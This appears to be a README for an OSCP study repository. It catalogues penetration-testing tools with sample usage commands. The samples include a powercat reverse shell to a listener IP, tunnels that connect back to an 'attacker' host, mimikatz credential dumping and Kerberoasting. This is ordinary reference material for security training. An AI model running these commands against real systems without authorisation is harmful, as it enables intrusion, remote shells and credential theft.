# Tools Directory

**Author:** r0tn3x

Essential penetration testing tools organized by category.

---

## 📂 Structure

```
Tools/
├── enumeration/          # Network & service enumeration
├── exploitation/         # Exploitation frameworks & scripts
├── privilege-escalation/ # Linux & Windows privesc tools
└── active-directory/     # AD attack tools
```

---

## 🔍 Enumeration Tools

### AutoRecon
**Location:** `enumeration/AutoRecon/`  
**Purpose:** Automated reconnaissance and enumeration  
**Usage:**
```bash
python3 autorecon.py 10.10.10.10
```

### nmapAutomator
**Location:** `enumeration/nmapAutomator/`  
**Purpose:** Automated nmap scanning  
**Usage:**
```bash
./nmapAutomator.sh 10.10.10.10 All
```

### SecLists
**Location:** `enumeration/SecLists/`  
**Purpose:** Collection of wordlists for fuzzing, bruteforce, etc.  
**Common paths:**
- Discovery/Web-Content/
- Passwords/
- Usernames/
- Fuzzing/

---

## 💥 Exploitation Tools

### Nishang
**Location:** `exploitation/nishang/`  
**Purpose:** PowerShell offensive security framework  
**Key scripts:**
- Shells/Invoke-PowerShellTcp.ps1
- Escalation/Invoke-AllChecks.ps1

### evil-winrm
**Location:** `exploitation/evil-winrm/`  
**Purpose:** WinRM shell access  
**Usage:**
```bash
evil-winrm -i 10.10.10.10 -u administrator -p password
```

### feroxbuster
**Location:** `exploitation/feroxbuster/`  
**Purpose:** Fast web directory/file brute forcing  
**Usage:**
```bash
feroxbuster -u http://10.10.10.10 -w /path/to/wordlist
```

### ffuf
**Location:** `exploitation/ffuf/`  
**Purpose:** Fast web fuzzer  
**Usage:**
```bash
ffuf -u http://10.10.10.10/FUZZ -w wordlist.txt
```

### powercat
**Location:** `exploitation/powercat/`  
**Purpose:** PowerShell reverse shell tool  
**Usage:**
```powershell
. .\powercat.ps1
powercat -c 10.10.14.10 -p 4444 -e powershell
```

---

## 🔓 Privilege Escalation Tools

### PEASS-ng (LinPEAS & WinPEAS)
**Location:** `privilege-escalation/PEASS-ng/`  
**Purpose:** Linux and Windows privilege escalation enumeration  
**Usage:**
```bash
# Linux
./linpeas.sh

# Windows
.\winPEASx64.exe
```

### pspy
**Location:** `privilege-escalation/pspy/`  
**Purpose:** Monitor Linux processes without root  
**Usage:**
```bash
./pspy64
```

### PrivescCheck
**Location:** `privilege-escalation/PrivescCheck/`  
**Purpose:** Windows privilege escalation enumeration  
**Usage:**
```powershell
. .\PrivescCheck.ps1
Invoke-PrivescCheck
```

---

## 🏢 Active Directory Tools

### BloodHound
**Location:** `active-directory/BloodHound/`  
**Purpose:** AD attack path visualization  
**Usage:**
```bash
# Start neo4j
sudo neo4j console

# Run ingestor
bloodhound-python -u user -p password -ns 10.10.10.10 -d domain.com -c all
```

### ligolo-ng
**Location:** `active-directory/ligolo-ng/`  
**Purpose:** Modern network tunneling  
**Usage:**
```bash
# Attacker
./proxy -selfcert

# Target
./agent -connect attacker:11601 -ignore-cert
```

### mimikatz
**Location:** `active-directory/mimikatz/`  
**Purpose:** Windows credential extraction  
**Usage:**
```powershell
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords
```

### Rubeus
**Location:** `active-directory/Rubeus/`  
**Purpose:** Kerberos attacks  
**Usage:**
```powershell
.\Rubeus.exe kerberoast
```

### Impacket
**Location:** `active-directory/impacket/`  
**Purpose:** Python AD attack toolkit  
**Key tools:**
- psexec.py
- secretsdump.py
- GetUserSPNs.py
- GetNPUsers.py

### NetExec
**Location:** `active-directory/NetExec/`  
**Purpose:** Modern CrackMapExec replacement  
**Usage:**
```bash
netexec smb 10.10.10.10 -u user -p password --shares
```

### Chisel
**Location:** `active-directory/chisel/`  
**Purpose:** Fast TCP/UDP tunnel over HTTP  
**Usage:**
```bash
# Server
./chisel server -p 8000 --reverse

# Client
./chisel client attacker:8000 R:socks
```

---

## 📥 Installation & Setup

Most tools are pre-compiled or ready to use. For tools requiring installation:

```bash
# Python tools
pip3 install -r requirements.txt

# Go tools
go build

# Compile from source (if needed)
make
```

---

## 🎯 OSCP Exam Allowed Tools

All tools in this directory are **ALLOWED** in the OSCP exam with restrictions:

- ✅ **Allowed:** All enumeration, exploitation, and privesc tools
- ✅ **Allowed:** Impacket, Mimikatz, Rubeus, BloodHound
- ⚠️ **Restricted:** Metasploit (1 module only)
- ❌ **Forbidden:** Commercial tools, automated exploitation frameworks

**Always check latest OSCP exam guide for tool restrictions!**

---

## 📚 Additional Resources

See [Notes/resources.md](../Notes/resources.md) for:
- Tool documentation links
- Video tutorials
- Usage examples

---

**Author:** r0tn3x | OSCP+ December 2025
